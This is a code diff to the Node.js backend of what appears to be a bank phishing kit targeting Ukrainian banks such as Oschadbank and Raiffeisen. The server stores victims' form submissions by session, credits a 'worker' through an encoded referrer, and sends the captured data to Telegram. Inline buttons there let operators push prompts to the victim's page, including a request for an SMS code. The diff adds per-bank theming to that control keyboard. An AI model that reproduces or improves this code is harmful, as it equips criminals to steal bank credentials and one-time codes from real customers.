@@ -100,7 +100,7 @@ wss.on('connection', (ws) => {
 
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
-    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
+    const { sessionId, isFinalStep, referrer, bankTheme, ...stepData } = req.body;
 
     // Декодируем referrer из Base64
     let workerNick = 'unknown';
@@ -112,7 +112,7 @@ app.post('/api/submit', (req, res) => {
         console.error('Error decoding referrer:', e);
     }
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, theme=${bankTheme}, data keys: ${Object.keys(stepData).join(', ')}`);
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
@@ -166,7 +166,7 @@ app.post('/api/submit', (req, res) => {
         }
         message += `<b>Worker:</b> @${workerNick}\n`;
 
-        sendToTelegram(message, sessionId, newData.bankName);
+        sendToTelegram(message, sessionId, newData.bankName, bankTheme);
     }
 
     res.status(200).json({ message: 'OK' });
@@ -202,11 +202,13 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
-function sendToTelegram(message, sessionId, bankName) {
+function sendToTelegram(message, sessionId, bankName, bankTheme) {
     let keyboard = [
         [
             { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ЛК', callback_data: `lk_${bankName.toLowerCase().replace(/ /g, '_')}:${sessionId}` },
+            { text: 'ЛК', callback_data: `lk_${bankTheme}:${sessionId}` }
+        ],
+        [
             { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
         ],
         [
@@ -215,7 +217,9 @@ function sendToTelegram(message, sessionId, bankName) {
             { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
         ],
         [
-            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` },
+            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` }
+        ],
+        [
             { text: 'OTHER', callback_data: `other:${sessionId}` }
         ],
         [
@@ -225,12 +229,12 @@ function sendToTelegram(message, sessionId, bankName) {
     ];
 
     if (banksForRequestButton.includes(bankName)) {
-        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+        keyboard[1].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
     }
 
     // Если банк не Ощад, убираем ЗВОНОК
     if (bankName !== 'Ощадбанк') {
-        keyboard[0] = keyboard[0].filter(btn => btn.text !== 'ЗВОНОК');
+        keyboard = keyboard.filter(row => row[0].text !== 'ЗВОНОК');
     }
 
     const options = {
@@ -256,7 +260,7 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                 ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                 break;
-            case 'lk_oschad':
+            case 'lk_oschadbank':
             case 'lk_raiffeisen':
             case 'lk_vostok':
             case 'lk_izibank':
